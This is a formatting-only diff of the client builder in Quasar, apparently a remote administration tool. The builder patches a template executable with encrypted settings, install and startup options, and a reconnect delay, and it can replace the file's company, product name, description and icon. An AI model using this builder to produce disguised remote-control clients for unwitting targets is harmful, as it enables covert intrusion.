@@ -6,21 +6,18 @@ using Quasar.Server.Data;
 using System;
 using Vestris.ResourceLib;
 
-namespace Quasar.Server.Build
-{
+namespace Quasar.Server.Build {
     /// <summary>
     /// Provides methods used to create a custom client executable.
     /// </summary>
-    public static class ClientBuilder
-    {
+    public static class ClientBuilder {
         /// <summary>
         /// Builds a client executable.
         /// </summary>
         /// <remarks>
         /// Assumes the 'client.bin' file exist.
         /// </remarks>
-        public static void Build(BuildOptions options)
-        {
+        public static void Build(BuildOptions options) {
             // PHASE 1 - Settings
             var keys = Aes128.DeriveKeys(options.Password);
             var key = Convert.ToBase64String(keys.Item1);
@@ -28,24 +25,18 @@ namespace Quasar.Server.Build
 
             AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
 
-            foreach (var typeDef in asmDef.Modules[0].Types)
-            {
-                if (typeDef.FullName == "Quasar.Client.Config.Settings")
-                {
-                    foreach (var methodDef in typeDef.Methods)
-                    {
-                        if (methodDef.Name == ".cctor")
-                        {
+            foreach (var typeDef in asmDef.Modules[0].Types) {
+                if (typeDef.FullName == "Quasar.Client.Config.Settings") {
+                    foreach (var methodDef in typeDef.Methods) {
+                        if (methodDef.Name == ".cctor") {
                             string encKey = StringHelper.GetRandomString(20);
 
                             int strings = 1, bools = 1;
 
-                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
-                            {
+                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++) {
                                 if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                 {
-                                    switch (strings)
-                                    {
+                                    switch (strings) {
                                         case 1: //version
                                             methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.Version, encKey);
                                             break;
@@ -81,12 +72,10 @@ namespace Quasar.Server.Build
                                             break;
                                     }
                                     strings++;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
-                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
-                                {
-                                    switch (bools)
-                                    {
+                                } else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
+                                           methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
+                                  {
+                                    switch (bools) {
                                         case 1: //install
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Install));
                                             break;
@@ -107,14 +96,12 @@ namespace Quasar.Server.Build
                                             break;
                                     }
                                     bools++;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
-                                {
+                                } else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
+                                  {
                                     //reconnectdelay
                                     methodDef.Body.Instructions[i].Operand = options.Delay;
-                                }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
-                                {
+                                } else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
+                                  {
                                     methodDef.Body.Instructions[i].Operand = GetSpecialFolder(options.InstallPath);
                                 }
                             }
@@ -133,8 +120,7 @@ namespace Quasar.Server.Build
             r.AsmDef.Write(options.OutputPath);
 
             // PHASE 4 - Assembly Information changing
-            if (options.AssemblyInformation != null)
-            {
+            if (options.AssemblyInformation != null) {
                 VersionResource versionResource = new VersionResource();
                 versionResource.LoadFrom(options.OutputPath);
 
@@ -142,7 +128,7 @@ namespace Quasar.Server.Build
                 versionResource.ProductVersion = options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
                 stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
                 stringFileInfo["ProductName"] = options.AssemblyInformation[0];
@@ -158,8 +144,7 @@ namespace Quasar.Server.Build
             }
 
             // PHASE 5 - Icon changing
-            if (!string.IsNullOrEmpty(options.IconPath))
-            {
+            if (!string.IsNullOrEmpty(options.IconPath)) {
                 IconFile iconFile = new IconFile(options.IconPath);
                 IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                 iconDirectoryResource.SaveTo(options.OutputPath);
@@ -171,8 +156,7 @@ namespace Quasar.Server.Build
         /// </summary>
         /// <param name="p">The value to convert to the OpCode</param>
         /// <returns>Returns the OpCode that represents the value provided.</returns>
-        private static OpCode BoolOpcode(bool p)
-        {
+        private static OpCode BoolOpcode(bool p) {
             return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         }
 
@@ -182,10 +166,8 @@ namespace Quasar.Server.Build
         /// <param name="installpath">The integer value of the install path.</param>
         /// <returns>Returns the signed-byte value of the special folder.</returns>
         /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
-        private static sbyte GetSpecialFolder(int installpath)
-        {
-            switch (installpath)
-            {
+        private static sbyte GetSpecialFolder(int installpath) {
+            switch (installpath) {
                 case 1:
                     return (sbyte)Environment.SpecialFolder.ApplicationData;
                 case 2:
